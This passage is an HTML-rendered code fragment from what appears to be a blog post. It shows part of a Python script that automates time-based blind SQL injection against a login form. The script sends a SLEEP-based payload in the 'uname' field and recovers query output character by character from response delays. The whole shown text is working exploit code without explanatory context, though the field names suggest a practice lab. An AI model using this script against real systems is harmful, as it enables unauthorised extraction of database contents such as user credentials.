>):</span><br><span class="line">            payload = <span class="string">"admin' and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))=&#123;mid&#125;,sleep(2),1) #"</span></span><br><span class="line">            startTime = time.time()</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">"passwd"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="string">"uname"</span>: payload.format(command=command, position=str(i), mid=str(j))</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">                result += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">"\r%s"</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

